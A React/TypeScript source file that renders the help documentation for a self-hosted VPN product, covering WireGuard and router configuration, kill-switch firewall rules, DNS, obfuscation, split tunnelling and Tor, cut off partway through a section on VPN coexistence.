// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { useState, useEffect, useRef } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";
import { PageSEO } from "@/components/PageSEO";
import {
  BookOpen, Wifi, Shield, Globe, Server, Terminal, Database,
  ScanSearch, Layers, Router, Cpu, Zap, EyeOff, GitBranch,
  Globe2, Activity, Network, Power, Search, ShieldPlus,
  ChevronRight, Bookmark, Copy, Check, AlertCircle, Info,
  Radio, Gamepad2, Tv, Smartphone, Monitor, Bug, FileText,
  Lock, Key, Settings, BarChart2, Bell, Map, TrendingUp,
  MapPin, Crosshair, Eye, Send, FolderSearch, Radar,
  Swords, Code2, GitCompare, ShieldAlert, Upload, GitMerge,
  RefreshCw, User, Download,
} from "lucide-react";

function CopyBtn({ text }: { text: string }) {
  const [done, setDone] = useState(false);
  const copy = () => { navigator.clipboard.writeText(text); setDone(true); setTimeout(() => setDone(false), 2000); };
  return (
    <button onClick={copy} className="ml-2 opacity-40 hover:opacity-100 transition-opacity">
      {done ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
    </button>
  );
}

function CB({ children, label }: { children: string; label?: string }) {
  return (
    <div className="my-2">
      {label && <div className="text-[8px] text-primary/30 font-mono uppercase tracking-widest mb-1">{label}</div>}
      <pre className="relative group font-mono text-[10px] bg-black border border-primary/15 rounded p-3 text-green-400/80 overflow-x-auto whitespace-pre-wrap leading-relaxed">
        {children}
        <button onClick={() => navigator.clipboard.writeText(children)}
          className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity text-primary/30 hover:text-primary">
          <Copy className="w-3 h-3" />
        </button>
      </pre>
    </div>
  );
}

function Note({ children, type = "info" }: { children: React.ReactNode; type?: "info" | "warn" | "danger" }) {
  const styles: Record<string, string> = {
    info:   "border-blue-500/20 bg-blue-900/10 text-blue-400/80",
    warn:   "border-yellow-500/20 bg-yellow-900/10 text-yellow-400/80",
    danger: "border-red-500/20 bg-red-900/10 text-red-400/80",
  };
  const icons: Record<string, React.ElementType> = { info: Info, warn: AlertCircle, danger: AlertCircle };
  const Icon = icons[type];
  return (
    <div className={`flex items-start gap-2 text-[9px] font-mono border rounded px-3 py-2 my-2 ${styles[type]}`}>
      <Icon className="w-3 h-3 mt-0.5 shrink-0" />
      <span>{children}</span>
    </div>
  );
}

interface Section {
  id: string; title: string; icon: React.ElementType;
  content: React.ReactNode;
}

const SECTIONS: Section[] = [
  {
    id: "overview", title: "Platform Overview", icon: BookOpen,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN is a fully self-hosted, enterprise-grade VPN platform built by <strong>ALPHA UNLIMITED TECHNOLOGIES LLC</strong>. It combines WireGuard's modern cryptography (AES-256-GCM, ChaCha20-Poly1305) with double-hop routing via VPN Gate, a SilkWeb honeypot mesh for active threat detection, an integrated Alpha Toolkit for advanced security research, and automatic IP whitelisting to prevent lockouts.</p>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3">
          {[
            { t: "WireGuard Core", d: "Modern VPN protocol with AES-256-GCM. Fastest and most secure available." },
            { t: "Double-Hop (VPN Gate)", d: "Route through community VPN Gate servers for an extra anonymity layer." },
            { t: "DNS Sinkhole", d: "Pi-hole equivalent built into the VPN. Blocks 100k+ ad, tracker, and malware domains at the DNS layer across all connected devices." },
            { t: "Network Traffic Monitor", d: "Real-time flow table showing every connection through the tunnel — IPs, ports, bytes, country, threat flags, and PCAP export." },
            { t: "SilkWeb Honeypot Mesh", d: "Decoy network that lures, fingerprints, and blocks attackers in real time." },
            { t: "SIEM — Security Event Log", d: "Unified event log aggregating WireGuard events, honeypot hits, firewall blocks, auth failures, and DNS sinkhole blocks." },
            { t: "Ghost Trace — Behavioral Analysis", d: "VPN-native agentless monitoring of every WireGuard peer. Detects C2 beaconing, data exfiltration, and malicious destinations — no agent needed on devices. Per-device anomaly scoring with Firewall quick-block integration. Command Center Pro." },
            { t: "QuantumAudit", d: "Standalone blockchain security auditing platform. Scans smart contracts and DeFi protocols for reentrancy, oracle manipulation, flash loan attacks, and post-quantum cryptographic weaknesses (ECDSA nonce reuse, Shor's algorithm exposure). Includes a 5-engine Signature Mining suite." },
            { t: "Security Hardening v2.1.0", d: "6 vulnerabilities patched: timing-safe secret comparison, SSL MitM prevention, shell-chain injection blocking, SSRF redirect re-validation, IP auto-ban (20 failures → 30-min block), WAF double-decode bypass protection. Desktop v2.1.0 adds TLS certificate pinning." },
            { t: "OSINT Recon Engine", d: "15+ passive intelligence sources (Shodan, Censys, AbuseIPDB, CT logs, HaveIBeenPwned) queried in parallel, all routed through the VPN." },
            { t: "Canary Tokens", d: "Invisible tripwires — HTTP URLs, DNS tokens, document beacons, AWS fake keys — that alert you the instant someone accesses them." },
            { t: "Ghost Chain Exploit Arsenal", d: "200+ categorized exploits (SQLi, XSS, RCE, SSRF, XXE, JWT, deserialization) with Details and PoC code tabs. Integrates with HTTP Probe and Intruder." },
            { t: "Exploit Importer", d: "Upload Nessus, Burp, Nikto, ZAP, or OpenVAS reports (ZIP auto-extracted). 30+ pattern categories extract findings with severity scoring and PoC code." },
            { t: "Alpha Toolkit", d: "Universal Scanner, Vuln Verifier, Web Scraper — all Tor-cloakable." },
            { t: "Kill Switch + Auto-IP", d: "Block all traffic if VPN drops. Your real IP is auto-detected and whitelisted so you never lose remote access." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/15 rounded p-3">
              <div className="text-[10px] font-mono font-bold text-primary mb-0.5">{t}</div>
              <div className="text-[9px] text-primary/83 font-mono">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Plan Tiers</h4>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {[
            { t: "VPN Basic", p: "$6.99/mo · $59.99/yr", d: "WireGuard VPN, Kill Switch, Leak Detection, DNS Shield, DNS Sinkhole, Network Traffic Monitor, Smart DNS, Split Tunneling, VPN Gate double-hop, Onion Browser, Router Config, IP Exposure Scanner, Obfuscation (Stealth Mode), Device Manager." },
            { t: "Command Center Pro", p: "$39.99/mo · $349.99/yr", d: "Everything in Basic plus the full offensive + defensive security suite: Alpha Toolkit, SQLmap, SilkWeb Honeypot, Firewall Manager, Threat Monitor, Remote Terminal, Security Audit, Threat Intelligence, SIEM, OSINT Recon, Canary Tokens, Ghost Chain Exploit Arsenal, Exploit Importer, HTTP Probe, Directory Fuzzer, Subdomain Scout, Intruder, Encoder, CVE Lookup, Payload Generator, Request Comparer." },
          ].map(({ t, p, d }) => (
            <div key={t} className="border border-primary/20 rounded p-3 bg-primary/5">
              <div className="text-[11px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[10px] text-green-400 font-mono font-bold mb-1">{p}</div>
              <div className="text-[9px] text-primary/83 font-mono leading-relaxed">{d}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "connect", title: "My VPN — Connecting", icon: Wifi,
    content: (
      <div className="space-y-3">
        <p>The <strong>My VPN</strong> page (<code>/my-vpn</code>) is your main connection hub. It shows your active tunnel, public IP, protocol, and connection stats. It also auto-detects your current IP and displays a green confirmation banner.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Connect</h4>
        <ol className="space-y-2 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>My VPN</strong> in the sidebar.</li>
          <li><span className="text-primary/30">2.</span> A green banner confirms: <strong>"Your current IP detected"</strong> — this IP is automatically embedded in your WireGuard config's PostUp/PostDown iptables rules.</li>
          <li><span className="text-primary/30">3.</span> Select a server from the map or the server list. Servers are sorted by latency.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Connect</strong>. The status indicator changes from grey to green.</li>
          <li><span className="text-primary/30">5.</span> Your real IP is replaced with the VPN server's IP. Verify at <code>https://api64.ipify.org</code>.</li>
          <li><span className="text-primary/30">6.</span> To disconnect, click the red <strong>Disconnect</strong> button.</li>
        </ol>
        <Note type="info">ProxhqVPN uses WireGuard by default. It re-establishes connections automatically if the network changes (e.g. switching from WiFi to cellular).</Note>
        <h4 className="font-bold text-primary text-[11px] mt-4">Connection Modes</h4>
        <div className="space-y-2">
          {[
            { m: "WireGuard (Default)", d: "Direct tunnel to the nearest ProxhqVPN server. Fastest option." },
            { m: "Double-Hop (VPN Gate)", d: "Your traffic first goes through a community VPN Gate server, then through ProxhqVPN. Extra anonymity layer — slightly slower." },
            { m: "Obfuscated (Stealth)", d: "Wraps WireGuard in obfs4 to look like HTTPS traffic. Bypasses VPN-blocking firewalls." },
          ].map(({ m, d }) => (
            <div key={m} className="border border-primary/10 rounded px-3 py-2 text-[10px] font-mono">
              <span className="text-primary font-bold">{m}</span> — <span className="text-primary/83">{d}</span>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "wireguard", title: "WireGuard Config", icon: Cpu,
    content: (
      <div className="space-y-3">
        <p>The <strong>WireGuard Config</strong> page (<code>/wireguard</code>) generates cryptographically-signed config files for any device. Generated configs now include <strong>automatic PostUp/PostDown IP whitelisting hooks</strong> so your remote access IP is never blocked when the kill switch activates.</p>
        <h4 className="font-bold text-primary text-[11px]">Generate a Config</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Your current IP is auto-detected and shown in a green banner.</li>
          <li><span className="text-primary/30">2.</span> Select a server location from the dropdown.</li>
          <li><span className="text-primary/30">3.</span> Choose DNS: ProxhqVPN DNS (default), Cloudflare, or system.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Generate</strong>. A config block appears with your IP embedded in PostUp/PostDown rules.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Download .conf</strong> for desktop/router or <strong>Show QR</strong> for mobile.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Sample Config Structure (with Auto-IP Hooks)</h4>
        <CB label="wireguard config file with kill switch hooks (wg0.conf)">{`[Interface]
PrivateKey = <your-generated-private-key>
Address = 10.8.0.2/24
DNS = 1.1.1.1
PostUp   = iptables -I OUTPUT ! -o wg0 -m mark ! --mark $(wg show wg0 fwmark) -m addrtype ! --dst-type LOCAL -j REJECT
PostUp   = iptables -I OUTPUT -s YOUR_SAFE_IP/32 -j ACCEPT
PostUp   = iptables -I OUTPUT -d VPN_ENDPOINT_IP/32 -j ACCEPT
PostDown = iptables -D OUTPUT ! -o wg0 -m mark ! --mark $(wg show wg0 fwmark) -m addrtype ! --dst-type LOCAL -j REJECT
PostDown = iptables -D OUTPUT -s YOUR_SAFE_IP/32 -j ACCEPT
PostDown = iptables -D OUTPUT -d VPN_ENDPOINT_IP/32 -j ACCEPT

[Peer]
PublicKey = <proxhqvpn-server-public-key>
Endpoint = vpn.proxhqvpn.net:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25`}</CB>
        <Note type="info">YOUR_SAFE_IP is automatically filled in from your detected IP. VPN_ENDPOINT_IP is the server's public IP — whitelisted so the WireGuard handshake always works even with the kill switch active.</Note>
        <h4 className="font-bold text-primary text-[11px] mt-3">Rotate Keys</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Rotate Keys</strong> to generate a new keypair. Old configs are immediately invalidated — update all devices after rotating.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">RAM-Only Server Keys (Mullvad Architecture)</h4>
        <p className="text-[10px] font-mono text-primary/83">ProxhqVPN nodes use a <strong>RAM-only WireGuard key architecture</strong> — the server-side private key is never written to disk. On boot, each node fetches its private key from the API via a PSK-authenticated request and writes it only to <code>/dev/shm/</code> (RAM filesystem). When the node is powered off or rebooted, the key vanishes. A disk image of the server reveals no key material. This is the same architecture used by Mullvad and ensures even a physical server seizure yields no cryptographic material.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Mobile WireGuard (iOS &amp; Android)</h4>
        <p className="text-[10px] font-mono text-primary/83">The ProxhqVPN mobile app includes a 3-step native WireGuard import flow:</p>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div><strong>Step 1 — Select Server:</strong> Choose a node (Chicago, London, LA, Tokyo) with live latency ping badges (green &lt;50ms / yellow &lt;150ms / red &gt;150ms).</div>
          <div><strong>Step 2 — Generate Config:</strong> Tap "Generate WireGuard Config" to call <code>/api/wireguard?nodeId=N</code> and receive a per-device .conf with your unique keypair.</div>
          <div><strong>Step 3 — Activate:</strong> Tap "Open in WireGuard" (iOS) or "Import to WireGuard" (Android). The app uses a <code>wireguard://airdrop/</code> deep link to pass the config directly to the official WireGuard app, which installs the tunnel at the OS level. A Share sheet fallback is provided if the deep link fails.</div>
        </div>
        <Note type="info">The official WireGuard app must be installed on your device. iOS: App Store. Android: Play Store. Links are shown inline in the ProxhqVPN mobile app.</Note>
      </div>
    ),
  },
  {
    id: "killswitch", title: "Kill Switch + Auto-IP", icon: Power,
    content: (
      <div className="space-y-3">
        <p>The <strong>Kill Switch</strong> (<code>/kill-switch</code>) blocks ALL internet traffic if the VPN tunnel drops, preventing IP leaks. It now includes <strong>Auto-IP Whitelisting</strong> — your current IP is detected automatically and pre-baked into the generated rules so you never lose remote access to your own machine.</p>
        <h4 className="font-bold text-primary text-[11px]">Auto-IP Detection</h4>
        <p className="text-[10px] font-mono text-primary/83">When you open the Kill Switch page, ProxhqVPN calls <code>/api/my-ip</code> and displays a green <strong>"SAFE IP AUTO-DETECTED"</strong> banner showing your current public IP. This IP is automatically embedded in all generated firewall rules.</p>
        <Note type="info">If you're on a dynamic IP, regenerate your kill switch rules after your IP changes. Your new IP will be auto-detected when you reload the page.</Note>
        <h4 className="font-bold text-primary text-[11px] mt-3">Platform Rules — Download</h4>
        <p className="text-[10px] font-mono text-primary/83">The Kill Switch page provides downloadable rule files for all three OS platforms, with your IP pre-baked in:</p>
        <div className="space-y-2">
          {[
            { t: "Linux (iptables)", d: "Download a .sh script that sets up iptables REJECT rules for all traffic outside wg0, while allowing your safe IP and the VPN endpoint." },
            { t: "macOS (pf firewall)", d: "Download a pf.conf snippet that blocks all non-VPN traffic. Includes an anchor rule allowing your IP to bypass the block." },
            { t: "Windows (netsh)", d: "Download a .bat script that sets Windows Firewall rules blocking all traffic except the WireGuard interface and your whitelisted IP." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How the Rules Work</h4>
        <CB label="linux kill switch rules (auto-generated with your ip)">{`# Block all outbound traffic NOT on wg0
iptables -I OUTPUT ! -o wg0 -m mark ! --mark $(wg show wg0 fwmark) -m addrtype ! --dst-type LOCAL -j REJECT

# Allow your safe IP (auto-detected) to bypass block
iptables -I OUTPUT -s YOUR_SAFE_IP/32 -j ACCEPT

# Allow VPN server endpoint IP (so handshake always works)
iptables -I OUTPUT -d VPN_ENDPOINT_IP/32 -j ACCEPT

# Allow local network traffic
iptables -I OUTPUT -o lo -j ACCEPT
iptables -I OUTPUT -d 192.168.0.0/16 -j ACCEPT`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Enable Kill Switch</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Kill Switch</strong> in the Protection section.</li>
          <li><span className="text-primary/30">2.</span> Confirm the green "SAFE IP AUTO-DETECTED" banner shows your correct IP.</li>
          <li><span className="text-primary/30">3.</span> Toggle <strong>Enable Kill Switch</strong> → Confirm.</li>
          <li><span className="text-primary/30">4.</span> The rules are applied. Status shows <span className="text-green-400">ACTIVE</span>.</li>
          <li><span className="text-primary/30">5.</span> To disable: toggle off and confirm — rules are flushed.</li>
        </ol>
        <Note type="warn">If you disable the kill switch while disconnected, your real IP will be briefly exposed. Always re-connect the VPN first.</Note>
      </div>
    ),
  },
  {
    id: "leaks", title: "Leak Test", icon: Search,
    content: (
      <div className="space-y-3">
        <p>The <strong>Leak Detection</strong> page (<code>/leaks</code>) tests for DNS leaks, WebRTC leaks, and IPv6 leaks — the three most common ways a VPN fails to protect you.</p>
        <div className="space-y-2">
          {[
            { t: "IP Leak Test", d: "Compares your detected IP against the VPN server IP. Any mismatch = your real IP is visible." },
            { t: "DNS Leak Test", d: "Sends DNS requests to a canary server and checks which DNS resolvers answered. Should only see ProxhqVPN's DNS or your VPN server's IP." },
            { t: "WebRTC Leak Test", d: "WebRTC can bypass VPN tunnels and expose your LAN/real IP. ProxhqVPN's script patches the browser's WebRTC STUN configuration." },
            { t: "IPv6 Leak Test", d: "Many VPNs only tunnel IPv4 traffic. ProxhqVPN checks for IPv6 route exposure and blocks it if found." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <Note type="info">Run the leak test while connected to ProxhqVPN. All results should show VPN IP addresses, not your ISP-assigned IP.</Note>
      </div>
    ),
  },
  {
    id: "dns", title: "DNS Protection", icon: ShieldPlus,
    content: (
      <div className="space-y-3">
        <p>The <strong>DNS Shield</strong> page (<code>/dns-shield</code>) configures encrypted DNS to prevent ISP tracking and DNS-based censorship.</p>
        <h4 className="font-bold text-primary text-[11px]">DNS Options</h4>
        <div className="space-y-2">
          {[
            { t: "ProxhqVPN DNS", d: "Default. Routes DNS through the VPN tunnel. Zero logs." },
            { t: "DNS-over-HTTPS (DoH)", d: "Encrypts DNS queries inside HTTPS. Even your ISP cannot see what domains you're resolving." },
            { t: "DNS-over-TLS (DoT)", d: "TLS-encrypted DNS on port 853. Supported by Cloudflare (1.1.1.1), Google (8.8.8.8)." },
            { t: "Custom DNS", d: "Set any DNS server IP. Use for private internal DNS in corporate environments." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Enable DNS Protection</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>DNS Protection</strong> → choose your preferred DNS provider.</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Apply</strong>. Your WireGuard DNS setting is updated automatically.</li>
          <li><span className="text-primary/30">3.</span> Regenerate your WireGuard config if you use a device with a cached config.</li>
        </ol>
      </div>
    ),
  },
  {
    id: "obfuscation", title: "Obfuscation (Stealth Mode)", icon: EyeOff,
    content: (
      <div className="space-y-3">
        <p>Obfuscation (<code>/obfuscation</code>) disguises VPN traffic so it looks like ordinary HTTPS/TLS traffic, bypassing deep packet inspection (DPI) used by China's Great Firewall, Russia's TSPU, and corporate firewalls.</p>
        <h4 className="font-bold text-primary text-[11px]">Obfuscation Methods</h4>
        <div className="space-y-2">
          {[
            { t: "obfs4", d: "Best general-purpose obfuscation. Randomizes packet length, timing, and byte patterns. Used by Tor Project." },
            { t: "Shadowsocks", d: "Stream cipher proxy. Widely used to bypass the Great Firewall. Looks like random data, not a VPN." },
            { t: "V2Ray (VMess)", d: "Advanced proxy protocol with traffic morphing. Mimics WebSocket or HTTP/2 traffic." },
            { t: "Stunnel / TLS Wrap", d: "Wraps WireGuard traffic inside a TLS 1.3 session. Appears as normal HTTPS to firewalls." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <Note type="warn">Obfuscation adds latency (typically 10–40ms extra). Use only when behind a restrictive firewall. For maximum speed, use standard WireGuard.</Note>
      </div>
    ),
  },
  {
    id: "splittunnel", title: "Split Tunneling", icon: GitBranch,
    content: (
      <div className="space-y-3">
        <p>Split Tunneling (<code>/split-tunnel</code>) lets you choose which apps or domains go through the VPN and which use your direct internet connection.</p>
        <h4 className="font-bold text-primary text-[11px]">Use Cases</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• Route <strong>Netflix</strong> through VPN (US server) while banking app uses your real IP (avoids fraud flags).</div>
          <div>• Route all <strong>corporate traffic</strong> through VPN but let <strong>YouTube</strong> bypass it for speed.</div>
          <div>• Tunnel only <strong>torrent clients</strong> through VPN — everything else stays on your ISP connection.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Configuration</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Split Tunnel</strong> → choose Exclude or Include mode.</li>
          <li><span className="text-primary/30">2.</span> <strong>Exclude mode</strong>: everything goes through VPN except the apps/IPs you list.</li>
          <li><span className="text-primary/30">3.</span> <strong>Include mode</strong>: only the apps/IPs you list use the VPN.</li>
          <li><span className="text-primary/30">4.</span> Add rules by IP range (CIDR) or domain. Changes apply immediately — no reconnect needed.</li>
        </ol>
        <CB label="example: split tunnel cidr entries">{`# Route only these through VPN:
10.0.0.0/8        # Corporate LAN
172.16.0.0/12     # Private datacenter range

# Bypass VPN for these:
8.8.8.8/32        # Google DNS (direct)
192.168.1.0/24    # Local home network`}</CB>
      </div>
    ),
  },
  {
    id: "proxy", title: "Proxy & Tor", icon: Globe2,
    content: (
      <div className="space-y-3">
        <p>The <strong>Proxy & Tor</strong> page (<code>/proxy</code>) manages SOCKS5 proxy endpoints and Tor bridge configuration. Use these to add extra anonymity layers on top of your VPN.</p>
        <h4 className="font-bold text-primary text-[11px]">SOCKS5 Proxy</h4>
        <p className="text-[10px] font-mono text-primary/83">ProxhqVPN exposes a SOCKS5 proxy on port 1080 of the VPN server. Configure your browser or torrent client to use it:</p>
        <CB label="socks5 proxy settings">{`SOCKS5 Host: 10.8.0.1  (VPN server internal IP)
Port: 1080
Authentication: use your ProxhqVPN credentials

# In curl:
curl --socks5-hostname 10.8.0.1:1080 https://api64.ipify.org`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Tor Integration (Ghost Chain)</h4>
        <p className="text-[10px] font-mono text-primary/83">ProxhqVPN runs a Tor daemon (127.0.0.1:9050). Traffic routed through Tor exits at a random Tor exit node — triple-hop: you → ProxhqVPN → Tor circuit → destination. This is referred to as <strong>Ghost Chain</strong> mode in the UI.</p>
        <CB label="verify tor is running">{`# On the server (via Terminal page):
systemctl status tor

# Check your Tor exit IP:
curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip`}</CB>
        <Note type="info">Tor adds significant latency (200–500ms typical). Use for maximum anonymity, not for streaming or gaming.</Note>
      </div>
    ),
  },
  {
    id: "vpngate", title: "VPN Gate (Double-Hop)", icon: Globe,
    content: (
      <div className="space-y-3">
        <p>VPN Gate (<code>/vpngate</code>) connects you to community-operated VPN servers worldwide for an extra anonymity layer. Your traffic goes: <strong>You → ProxhqVPN → VPN Gate Server → Internet</strong>.</p>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>VPN Gate</strong> — the page fetches the live server list from vpngate.net.</li>
          <li><span className="text-primary/30">2.</span> Filter by country, latency, or protocol (OpenVPN/L2TP).</li>
          <li><span className="text-primary/30">3.</span> Click a server → <strong>Generate Config</strong> → the config is created for that specific VPN Gate endpoint.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Connect via Gate</strong> to activate the double-hop tunnel.</li>
        </ol>
        <Note type="warn">VPN Gate servers are community-run and logs may exist on them. Use for geo-unblocking, not for high-security anonymity.</Note>
      </div>
    ),
  },
  {
    id: "onion", title: "Onion Browser", icon: Globe2,
    content: (
      <div className="space-y-3">
        <p>The <strong>Onion Browser</strong> (<code>/onion-browser</code>) is a built-in dark web browser that routes traffic through Tor circuits, accessible directly from the ProxhqVPN dashboard.</p>
        <h4 className="font-bold text-primary text-[11px]">Usage</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Click <strong>Onion Browser</strong> in the Network section.</li>
          <li><span className="text-primary/30">2.</span> Enter any .onion address or clearnet URL in the address bar.</li>
          <li><span className="text-primary/30">3.</span> Traffic is routed: ProxhqVPN Server → Tor Entry Guard → Tor Relay → Tor Exit → Destination.</li>
          <li><span className="text-primary/30">4.</span> The exit IP shown is a Tor exit node — not your real IP, not ProxhqVPN's IP.</li>
        </ol>
        <CB label="example .onion addresses to test">{`# DuckDuckGo Onion:
https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion

# New York Times:
https://www.nytimesn7cgmftshazwhfgzm37qxb44r64ytbb2dj3x62d2lljsciiyd.onion`}</CB>
        <Note type="warn">Do not use the Onion Browser for illegal activity. It provides anonymity, not immunity from law enforcement.</Note>
      </div>
    ),
  },
  {
    id: "smartdns", title: "Smart DNS", icon: Zap,
    content: (
      <div className="space-y-3">
        <p>Smart DNS (<code>/smart-dns</code>) bypasses geo-blocks on streaming services (Netflix, Hulu, BBC iPlayer) without routing ALL your traffic through a VPN. Only DNS queries for geo-blocked domains are intercepted and spoofed.</p>
        <h4 className="font-bold text-primary text-[11px]">Setup Smart DNS</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Smart DNS</strong> → copy the two DNS server IPs.</li>
          <li><span className="text-primary/30">2.</span> On your device, set the DNS servers to the ProxhqVPN Smart DNS addresses.</li>
          <li><span className="text-primary/30">3.</span> No VPN app needed — works on any device including Smart TVs and game consoles.</li>
          <li><span className="text-primary/30">4.</span> Supported regions: US, UK, Canada, Australia, Japan (configurable).</li>
        </ol>
        <Note type="info">Smart DNS does NOT encrypt your traffic. It only changes which content you can access. For privacy, use the full VPN.</Note>
      </div>
    ),
  },
  {
    id: "router", title: "Router Config", icon: Router,
    content: (
      <div className="space-y-3">
        <p>The <strong>Router Config</strong> page (<code>/router-config</code>) generates platform-specific WireGuard configs for routers, protecting every device on your network automatically. Your current IP is auto-detected and embedded in the kill switch rules for each firmware.</p>
        <h4 className="font-bold text-primary text-[11px]">Supported Router Firmware</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { f: "OpenWRT",         d: "opkg + luci-proto-wireguard" },
            { f: "DD-WRT",          d: "Built-in WireGuard module" },
            { f: "AsusWRT-Merlin",  d: "wg-quick via Entware" },
            { f: "pfSense / OPNsense", d: "VPN → WireGuard UI" },
            { f: "GL.iNet",         d: "Native WireGuard in GL admin panel" },
            { f: "Ubiquiti EdgeOS", d: "configure via set interfaces wireguard" },
          ].map(({ f, d }) => (
            <div key={f} className="text-[9px] font-mono border border-primary/10 rounded px-2 py-1.5">
              <div className="text-primary font-bold">✓ {f}</div>
              <div className="text-primary/78 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">OpenWRT Quick Setup</h4>
        <CB label="ssh into your openwrt router and run:">{`# Install WireGuard
opkg update
opkg install wireguard-tools kmod-wireguard luci-proto-wireguard

# Create interface
uci set network.wg0=interface
uci set network.wg0.proto=wireguard
uci set network.wg0.private_key='PASTE_PRIVATE_KEY_FROM_PROXHQVPN'
uci set network.wg0.addresses='10.8.0.2/24'
uci commit network
/etc/init.d/network restart`}</CB>
        <Note type="info">After running the Setup Script from the Router Config page, your router config includes your safe IP pre-baked into PostUp/PostDown rules so you never lose LAN access when the kill switch fires.</Note>
      </div>
    ),
  },
  {
    id: "vpncoexist", title: "VPN Coexistence", icon: Settings,
    content: (
      <div className="space-y-3">
        <p><strong>VPN Coexistence</strong> (<code>/vpn-coexist</code>) lets ProxhqVPN run alongside other VPN clients simultaneously — corporate VPNs, NordVPN, ExpressVPN, Tailscale, ZeroTier — with 4 coexistence modes and auto-detection of running VPN processes. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">4 Coexistence Modes</h4>
        <div className="space-y-2">
          {[
            { t: "fwmark Mode (recommended)", d: "Each VPN uses a different Linux fwmark value for its traffic. Separate routing tables keep traffic isolated. ProxhqVPN uses mark 51820 by default — auto-adjusted if conflict detected." },
            { t: "Double-Hop Mode", d: "Traffic routes: Device → Commercial VPN (NordVPN/Express/etc.) → ProxhqVPN exit node. Both tunnels active simultaneously. Your IP at exit = ProxhqVPN node IP. Use for maximum anonymity." },
            { t: "Network Namespace Mode", d: "ProxhqVPN runs in its own Linux network namespace. Completely isolated from other VPN interfaces. Most compatible but requires root on Linux." },
            { t: "Routing Table Mode", d: "Uses separate routing table (table 100 by default) for ProxhqVPN traffic. Coexists with any VPN that uses the main routing table. Compatible with all commercial VPN clients." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Auto-Detection</h4>
        <p className="text-[10px] font-mono text-primary/83">VPN Coexistence auto-detects running VPN processes: NordVPN, ExpressVPN, ProtonVPN, Mullvad, Surfshark, Tailscale, ZeroTier. The detected VPN's fwmark and interface are shown, and ProxhqVPN configures itself to avoid conflicts automatically.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Exception Rules</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>bypass-proxhq</strong> — route specific subnets (e.g. 10.0.0.0/8) through the commercial VPN instead of ProxhqVPN</div>
